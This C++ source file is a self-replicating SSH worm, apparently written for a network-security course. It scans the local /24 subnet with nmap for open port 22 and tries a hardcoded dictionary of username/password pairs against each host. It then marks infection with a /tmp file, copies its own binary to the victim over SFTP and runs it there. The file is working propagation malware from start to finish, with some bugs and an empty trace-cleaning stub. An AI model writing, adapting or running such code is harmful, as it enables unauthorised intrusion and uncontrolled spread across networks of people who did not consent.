#define LIBSSH_STATIC 1
#include <libssh/libssh.h>
#include <stdlib.h>
#include <stdio.h>
#include<errno.h>
#include<strings.h>
#include<cstring>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <string>
#include <iostream>
#include <sstream>
#include <fstream>
#include <libssh/sftp.h>
#include <sys/stat.h>
#include <fcntl.h>
#include<vector>
#include<map>
  




  
void markInfected() {
    std::ofstream myfile("/tmp/infectionMarker_replicatorWorm.txt");
     
    if (myfile.is_open())
    {
        myfile << "This system is infected\n" <<std::endl;
        myfile.close();
    }
    else
        printf( "Unable to open file");
  
}
  
int isInfected(ssh_session session) {
    sftp_file file;
    int rc;
    sftp_session sftp;
    int access_type = O_RDONLY;
 
    sftp = sftp_new(session);
    if (sftp == NULL)
    {
        fprintf(stderr, "\nError allocating SFTP session: %s\n",
            ssh_get_error(session));
        return 11;
    }
 
    rc = sftp_init(sftp);
    if (rc != SSH_OK)
    {
        sftp_free(sftp);
        return 1;
    }
      
    file = sftp_open(sftp, "/tmp/infectionMarker_replicatorWorm.txt",access_type, 0);
    if (file == NULL) {
        printf("\nFile does not exist");
        return 0;
    }
    else {
        printf("\nSystem Infected");
        return 1;
    }
}
  
std::vector<std::string> getHostsOnSameNetwork() {
    FILE *fp;
    char path[1035];
    std::vector<std::string> res;
    int i;
 
    fp = popen("nmap 192.168.1.0/24 -p 22 --open | grep 'Nmap scan report for'| cut -f 5 -d ' '", "r");
    if (fp == NULL) {
        printf("\nFailed to run command");
        pclose(fp);
//Need to put something
    }
    else {
        while (!feof(fp)) {
            if (fgets(path, sizeof(path), fp) != NULL) {
                res.push_back(path);
            }
        }
            
        pclose(fp);
        return res;
    }
}
 
  
void cleanTraces(ssh_session session) {
      
}
  
  
int copyFile(ssh_session session) {
    sftp_file file;
    int rc;
    int access_type = O_WRONLY | O_CREAT | O_TRUNC;
    sftp_session sftp;
 
    sftp = sftp_new(session);
    if (sftp == NULL)
    {
        fprintf(stderr, "\nError allocating SFTP session: %s\n",
            ssh_get_error(session));
        return SSH_ERROR;
    }
    rc = sftp_init(sftp);
    if (rc != SSH_OK)
    {
        sftp_free(sftp);
        return rc;
    }
 
    file = sftp_open(sftp, "/tmp/a.out",
        access_type, S_IRWXU);
    if (file == NULL)
    {
        fprintf(stderr, "\nCan't open remote file for writing: %s\n",
            ssh_get_error(session));
        return 0;
    }
     
    std::ifstream fin("/tmp/a.out", std::ios::binary);
    if (fin) {
        fin.seekg(0, std::ios::end);
        std::ios::pos_type length = fin.tellg(); // get file size in bytes
        fin.seekg(0); // rewind to beginning of file
          
        char* replicatorFile = new char[length];
        fin.read(replicatorFile, length); // read file contents into buffer
  
        sftp_write(file, replicatorFile, length); // write to remote file
    }
    else {
        return 0;
    }
     
    rc = sftp_close(file);
    if (rc != SSH_OK)
    {
        fprintf(stderr, "\nCan't close the written file: %s\n",
            ssh_get_error(session));
        return 0;
    }
    printf("\nCopy Successfull !");
    return 1;
  
  
}
  
int executeFile(ssh_session session) {
    ssh_channel channel;
    int rc;
    channel = ssh_channel_new(session);
 
    if (channel != NULL) {
        rc = ssh_channel_open_session(channel);
        if (rc == SSH_OK) {
            if (copyFile(session)) {
                rc = ssh_channel_request_exec(channel, "/tmp/a.out");
                if (rc == SSH_OK) {
		    printf("\nExecuted command on remote machine");
                }
                else {
                    printf("\nCannot give run permissions to the file");
		    return 0;
                } 
            }
            else {
                printf("\nError While copying");
		return 0;
            }
        }
        else {
            printf("\nError establishing channel for executing remote");
	    return 0;
        }
    }
    else {
        printf("\nCould not Connect to Host");
	return 0;
    }
}
  
int connectionToHost(ssh_session session, std::string host, std::map<std::string, std::string> &dictAttackList){
	int rc;
	ssh_options_set(session, SSH_OPTIONS_HOST, host.c_str());
	const char *username, *password;
	
	
	rc = ssh_connect(session);
  
	if (rc == SSH_OK) {

		if (ssh_write_knownhost(session) < 0) {
			fprintf(stderr, "Error %s", strerror(errno));
			return 0;
		}
		else {
			for (std::map<std::string, std::string>::iterator it = dictAttackList.begin(); it != dictAttackList.end(); it++) {  				
				
				username= (it->first).c_str();
				password = (it->second).c_str();

				rc = ssh_userauth_password(session, NULL, password);
				if(rc == SSH_AUTH_SUCCESS){
					printf("\nLogin Success");
                			return 1;
				} 
    			}
			if(rc != SSH_AUTH_SUCCESS){
				printf("\n Error Authenticating");
			}
		}

	}

	else{
       		fprintf(stderr, "\nError Connecting to localhost: %s\n", ssh_get_error(session));
		return 0;
    	}
}




void initializeDict(std::map<std::string, std::string> &dictAttackList){
	dictAttackList["ubuntu"] = "123456";
	dictAttackList["hello"]="worlds";
	dictAttackList["cpsc"]="c473";
	dictAttackList["network"] = "security";
	printf("\nDictionary Initialized !!!");
}
  
  
int main() {
  
    ssh_session my_ssh_session;
    ssh_channel channel;
    int res;
    std::map<std::string, std::string> dictAttackList;
    initializeDict(dictAttackList);
    
    markInfected();
    std::vector<std::string> hosts = getHostsOnSameNetwork();
 
    for (std::vector<std::string>::iterator host = hosts.begin(); host != hosts.end(); ++host) {
        std::cout << "\n Host: " << *host;

 	my_ssh_session = ssh_new();
    	if (my_ssh_session == NULL)
        	exit(-1);

        if (connectionToHost(my_ssh_session, *host, dictAttackList) > 0) {
		printf("\nSucceded to get into the host");
            
		if (!isInfected(my_ssh_session)) {
                res = executeFile(my_ssh_session);
		if(res){
			std::cout<<"\n Infected. " << *host << ". I can rest now ;)\n";
			break;
		}
            }
        }
    }
}
